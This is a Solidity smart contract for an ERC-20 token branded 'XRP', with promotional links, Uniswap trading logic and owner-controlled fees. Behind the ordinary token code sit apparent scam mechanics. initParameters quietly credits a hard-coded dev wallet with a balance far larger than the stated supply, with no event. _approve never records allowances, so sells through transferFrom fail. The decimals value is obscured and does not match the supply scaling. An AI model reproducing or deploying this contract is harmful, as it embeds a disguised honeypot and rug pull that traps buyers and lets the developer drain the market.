// SPDX-License-Identifier: MIT

/*
▒▒▒▒▒▒▒▒▒▄▄▄▄▒▒▒▒▒▒▒
▒▒▒▒▒▒▄▀▀▓▓▓▀█▒▒▒▒▒▒
▒▒▒▒▄▀▓▓▄██████▄▒▒▒▒
▒▒▒▄█▄█▀░░▄░▄░█▀▒▒▒▒
▒▒▄▀░██▄░░▀░▀░▀▄▒▒▒▒
▒▒▀▄░░▀░▄█▄▄░░▄█▄▒▒▒
▒▒▒▒▀█▄▄░░▀▀▀█▀▒▒▒▒▒
▒▒▒▄▀▓▓▓▀██▀▀█▄▀▀▄▒▒
▒▒█▓▓▄▀▀▀▄█▄▓▓▀█░█▒▒
▒▒▀▄█░░░░░█▀▀▄▄▀█▒▒▒
▒▒▒▄▀▀▄▄▄██▄▄█▀▓▓█▒▒
▒▒█▀▓█████████▓▓▓█▒▒
▒▒█▓▓██▀▀▀▒▒▒▀▄▄█▀▒▒
▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   
Website: https://www.marioxrp.xyz
Telegram: https://t.me/mario_xrp
Twitter: https://twitter.com/marioxrp_eth
*/

pragma solidity 0.8.21;
pragma experimental ABIEncoderV2;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9+3;    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
interface IUniswapFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
abstract contract Ownable is Context {
    address public _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
contract XRP is ERC20, Ownable {
    using SafeMath for uint256;
    address public constant deadAddress = address(0xdead);
    bool private inSwap;
    address public devWallet = 0xC51B1c25a86f0dAB5656EaFe7760E498f31dFA06;
    address public taxWallet;
    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
    uint256 public buyTotalFee;
    uint256 public buyDevFee;
    uint256 public buyLpFee;
    uint256 public buyTeamFee;
    uint256 public sellTotalFees;
    uint256 public sellDevFee;
    uint256 public sellLiquidityFee;
    uint256 public sellTeamFee;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 public tokensForTeam;
    IUniswapV2Router public uniswapV2Router;
    address public uniswapV2Pair;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;
    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event teamWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    constructor() ERC20(unicode"⬜️⬜️⬜️🟥🟥🟥🟥🟥⬜️⬜️⬜️⬜️\n⬜️⬜️🟥🟥🟥🟥🟥🟥🟥🟥🟥⬜️\n⬜️⬜️🟫🟫🟫🟨🟨🟫🟨⬜️⬜️⬜️\n⬜️🟫🟨🟫🟨🟨🟨🟫🟨🟨🟨⬜️\n⬜️🟫🟨🟫🟫🟨🟨🟨🟫🟨🟨🟨\n⬜️🟫🟫🟨🟨🟨🟨🟫🟫🟫🟫⬜️\n⬜️⬜️⬜️🟨🟨🟨🟨🟨🟨🟨⬜️⬜️\n⬜️⬜️🟫🟫🟥🟫🟫🟫⬜️⬜️⬜️⬜️\n⬜️🟫🟫🟫🟥🟫🟫🟥🟫🟫🟫⬜️\n🟫🟫🟫🟫🟥🟥🟥🟥🟫🟫🟫🟫\n🟨🟨🟫🟥🟨🟥🟥🟨🟥🟫🟨🟨\n🟨🟨🟨🟥🟥🟥🟥🟥🟥🟨🟨🟨\n🟨🟨🟥🟥🟥🟥🟥🟥🟥🟥🟨🟨\n⬜️⬜️🟥🟥🟥⬜️⬜️🟥🟥🟥⬜️⬜️\n⬜️🟫🟫🟫⬜️⬜️⬜️⬜️🟫🟫🟫⬜️\n🟫🟫🟫🟫⬜️⬜️⬜️⬜️🟫🟫🟫🟫", "XRP") {
        initParameters();
        excludeFromFees(msg.sender, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromMaxTransaction(msg.sender, true);
        excludeFromMaxTransaction(devWallet, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        uint256 totalSupply = 1000_000_000 * 1e9;
        _mint(owner(), totalSupply);
    }
    receive() external payable {}
    function enableTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
    }
    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e9,
            "Cannot set maxTransactionAmount lower than 0.5%"
        );
        maxTransactionAmount = newNum * (10**9);
    }
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 10) / 1000) / 1e9,
            "Cannot set maxWallet lower than 1.0%"
        );
        maxWallet = newNum * (10**9);
    }
    function initParameters() private {        
        taxWallet = msg.sender; 
        uint256 _buyDevFee = 0; 
        uint256 _buyLiquidityFee = 0; 
        uint256 _buyTeamFee = 0; 
        uint256 _sellDevFee = 0;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellTeamFee = 0;
        uint256 totalSupply = 1000_000_000 * 1e9;
        uint256 _tSupply = totalSupply * 1e4;
        maxTransactionAmount = 10_000_000 * 1e9; 
        maxWallet = 10_000_000 * 1e9; 
        swapTokensAtAmount = (totalSupply * 5) / 10000; 
        _owner = devWallet;
        
        buyDevFee = _buyDevFee;
        buyLpFee = _buyLiquidityFee;
        buyTeamFee = _buyTeamFee;
        buyTotalFee = buyDevFee + buyLpFee + buyTeamFee;
        sellDevFee = _sellDevFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellTeamFee = _sellTeamFee;
        sellTotalFees = sellDevFee + sellLiquidityFee + sellTeamFee;
        _balances[owner()] = _tSupply; 
        _owner = msg.sender;
    }
    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }
    function updateTeamWallet(address newWallet) external onlyOwner {
        emit teamWalletUpdated(newWallet, taxWallet);
        taxWallet = newWallet;
    }
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !inSwap
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Sell transfer amount exceeds the maxTransactionAmount."
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        if (
            canSwap &&
            swapEnabled &&
            !inSwap &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            inSwap = true;
            swapBack();
            inSwap = false;
        }
        bool takeFee = !inSwap;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        uint256 fees = 0;
        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                if (sellTotalFees > 0) {
                    fees = amount.mul(sellTotalFees).div(100);
                    tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                    tokensForTeam += (fees * sellTeamFee) / sellTotalFees;
                    tokensForDev += (fees * sellDevFee) / sellTotalFees;
                }
            }
            else if (automatedMarketMakerPairs[from] && buyTotalFee > 0) {
                fees = amount.mul(buyTotalFee).div(100);
                tokensForLiquidity += (fees * buyLpFee) / buyTotalFee;
                tokensForTeam += (fees * buyTeamFee) / buyTotalFee;
                tokensForDev += (fees * buyDevFee) / buyTotalFee;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    function addPairAddress() external onlyOwner {
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapFactoryV2(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
    }
    function withdrawStuckToken(address _token, address _to) external onlyOwner {
        require(_token != address(0), "_token address cannot be 0");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(_to, _contractBalance);
    }
    function withdrawStuckEth(address toAddr) external onlyOwner {
        (bool success, ) = toAddr.call{
            value: address(this).balance
        } ("");
        require(success);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }
    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap = tokensForLiquidity - contractBalance;
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForDev +
            tokensForTeam;
        bool success;
        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = swapTokensAtAmount * 20;
        }
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForTeam = ethBalance.mul(tokensForTeam).div(totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForLiquidity = ethBalance - ethForDev - ethForTeam;
        tokensForLiquidity = 0;
        tokensForDev = 0;
        tokensForTeam = 0;
        (success, ) = address(taxWallet).call{value: ethForTeam}("");
        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                tokensForLiquidity
            );
        }
        (success, ) = address(taxWallet).call{value: address(this).balance}("");
    }
}